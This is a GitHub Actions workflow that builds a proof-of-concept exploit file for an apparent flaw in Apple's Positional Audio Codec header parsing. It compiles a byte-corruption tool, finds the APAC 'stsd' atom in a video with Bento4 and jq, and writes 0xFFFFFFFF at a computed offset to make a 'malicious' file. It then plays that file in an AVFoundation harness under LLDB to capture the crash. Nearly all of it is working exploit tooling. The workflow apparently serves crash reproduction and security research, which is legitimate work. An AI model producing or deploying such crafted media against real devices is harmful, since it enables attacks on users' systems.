name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # This script is a simple utility to corrupt a file at a specific offset.
      - name: Patch encodeme.mm to be a Simple File Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to be a simple corruption utility..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <stdio.h>
          #include <stdlib.h>

          int main(int argc, const char * argv[]) {
              if (argc != 3) {
                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
                  return 1;
              }

              const char* filePath = argv[1];
              long offset = atol(argv[2]);

              FILE *file = fopen(filePath, "r+b");
              if (!file) {
                  fprintf(stderr, "Failed to open file: %s\n", filePath);
                  return 1;
              }

              fprintf(stderr, "Corrupting file at offset 0x%lx...\n", offset);
              fseek(file, offset, SEEK_SET);
              
              // This is the malicious data that triggers the vulnerability
              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
              fclose(file);
              
              fprintf(stderr, "Corruption complete.\n");
              return 0;
          }
          EOF

      # New Step: Create a custom Swift harness that uses AVAudioPlayer
      - name: Create Swift Player Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating Swift audio player harness..."
          cat > harness.swift << 'EOF'
          import Foundation
          import AVFoundation

          class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
              var isPlaying = true
              func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
                  print("Playback finished. Success: \(flag)")
                  isPlaying = false
              }
              func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
                  print("Decode error: \(error?.localizedDescription ?? "unknown error")")
                  isPlaying = false
              }
          }

          if CommandLine.arguments.count < 2 {
              print("Usage: ./harness <file_path>")
              exit(1)
          }

          let filePath = CommandLine.arguments[1]
          let fileURL = URL(fileURLWithPath: filePath)

          print("Attempting to play: \(filePath)")

          do {
              let delegate = PlayerDelegate()
              let audioPlayer = try AVAudioPlayer(contentsOf: fileURL)
              audioPlayer.delegate = delegate
              audioPlayer.play()
              
              print("Playback started...")
              // Keep the program running while the audio plays.
              while delegate.isPlaying {
                  RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
              }
              print("Harness finished.")

          } catch {
              print("Failed to initialize AVAudioPlayer: \(error.localizedDescription)")
              exit(1)
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the C++ corruption utility
      - name: Compile Corruption Utility
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme_corruptor..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
      
      # New Step: Compile the Swift player harness
      - name: Compile Swift Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling Swift harness..."
          swiftc harness.swift -o harness
          if [ $? -ne 0 ]; then echo "Swift compilation failed."; exit 1; fi

      # This step now uses professional tools to find the offset and corrupt the file.
      - name: Surgically Corrupt APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          set -x 
          
          echo "Installing Bento4 and jq to find the correct atom offset..."
          brew install bento4 jq

          cp IMG_1027.mov output_apac_poc.mp4
          
          mp4dump --format json output_apac_poc.mp4 > atom_dump.json
          
          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)

          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
            echo "Could not find audio 'stsd' offset using jq. Using fallback."
            OFFSET=3461 # Fallback offset from manual analysis
          fi
          
          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
          
          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
          
          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"

          ./encodeme_corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
          
          echo "Malicious APAC PoC file generated."
          ls -l output_apac_poc.mp4
          
      # Updated: This step now uses our custom Swift harness under the debugger.
      - name: Launch Custom Player Under LLDB to Catch Crash
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Custom Swift Player with final PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor the harness..."
          cat > player_debug_script.lldb << 'EOF'
          run
          bt
          quit
          EOF

          echo "Launching custom harness under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
          retention-days: 7
          if-no-files-found: error
